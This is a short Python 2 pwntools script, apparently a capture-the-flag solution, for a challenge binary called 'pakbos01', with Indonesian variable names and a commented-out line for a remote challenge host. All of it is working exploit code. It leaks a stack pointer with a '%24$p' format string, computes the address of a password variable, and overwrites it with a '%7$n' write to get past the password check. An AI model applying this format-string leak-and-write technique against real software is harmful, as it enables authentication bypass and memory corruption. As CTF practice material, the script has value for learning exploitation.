from pwn import *
#r = remote('3.0.19.78', 10001)
r = process('./pakbos01')         # lokal
print r.recvuntil('password: ')
r.sendline('%24$p')
base = int(r.recvuntil('?')[2:-1],16)
jarak = 0x555555756040 - 0x0000555555554700
addr_pw = base+jarak
print 'Base = ' + hex(base)
print 'addr_pw = ' + hex(addr_pw)
r.recvuntil('password: ')
r.sendline('aaaa%7$n'+p64(addr_pw))
r.recvuntil('password: ')
r.sendline('\x04')
r.interactive()
r.close()
